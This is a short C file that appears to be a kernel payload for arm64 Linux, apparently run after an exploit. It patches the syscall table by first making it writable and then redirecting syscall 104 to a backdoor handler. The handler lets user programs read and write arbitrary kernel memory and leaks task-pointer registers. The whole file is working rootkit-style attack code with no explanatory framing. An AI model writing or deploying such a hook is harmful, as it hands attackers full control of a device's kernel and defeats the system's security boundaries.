#include "linux.h"

void* const _orig_kexec = (void*)0x12345678;
#define orig_kexec (*((void* volatile*)&_orig_kexec))

unsigned long long syscall(unsigned long long cmd, void* param1, void* param2)
{
    unsigned long long ans[2];
    switch(cmd)
    {
    case 1:
        linux___arch_copy_to_user(param2, param1, 4096);
        break;
    case 2:
        linux___arch_copy_from_user(param1, param2, 4096);
        break;
    case 3:
        linux_sys_call_table[104] = orig_kexec;
        break;
    case 4:
        asm volatile("mrs %0, sp_el0\nmrs %1, tpidr_el1":"=r"(ans[0]),"=r"(ans[1]));
        linux___arch_copy_to_user(param2, ans, 16);
        break;
    default:
        return -38;
    }
    return 1506 + cmd;
}

unsigned long long _start()
{
    unsigned long long tbl_addr = (unsigned long long)&linux_sys_call_table;
    tbl_addr += 104 * 8;
    unsigned long long addr1 = tbl_addr & ~4095ull;
    unsigned long long addr2 = ((tbl_addr + 7) | 4095ull) + 1;
    linux_set_memory_rw(addr1, addr2 - addr1);
    orig_kexec = linux_sys_call_table[104];
    linux_sys_call_table[104] = (void*)&syscall;
    return 1506;
}
